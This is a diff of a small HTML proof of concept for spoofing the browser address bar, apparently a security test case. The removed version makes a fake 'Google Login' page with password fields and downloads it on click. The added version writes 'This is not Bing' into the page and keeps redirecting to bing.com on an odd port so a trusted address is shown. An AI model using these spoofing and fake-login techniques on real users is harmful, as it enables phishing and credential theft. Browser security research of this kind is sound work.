@@ -1,43 +1,9 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Spoof Omni Box</title>
-</head>
-<body>
-
-    <a id="short" href="#">Spoof Omni Box</a>
-    <br><br>
-
-    <script>
-        const short = document.getElementById('short');
-    
-        short.addEventListener('click', (event) => {
-            var fileContent = `
-                <html>
-                <head>
-                <title>Google Login</title>
-                </head>
-                <body>
-                <h1>Google Login</h1>
-                Email : <input type="text"></input>
-                Password : <input type="password"></input>
-                <button>Login</button>
-                </body>
-                </html>
-            `;
-            var fileName = 'aaaaaaaaaaa';
-    
-            var blob = new Blob([fileContent], { type: 'text/html' });
-    
-            event.target.href = window.URL.createObjectURL(blob);
-            setTimeout(() => {
-                event.target.download = fileName;
-            }, 10);
-        });
-    </script>
-    
-
-</body>
-</html>
+<script>
+    function spoof() {
+    document.write("<h1>This is not Bing</h1>");
+    document.location = "https://bing.com:1234";
+    setInterval(function(){document.location="https://bing.com:1234";},9800);
+    };
+</script>
+<p class="test"><input class="btn btn-success btn-lg" type="button" value="Run test case" onclick="spoof();" />
+</p>
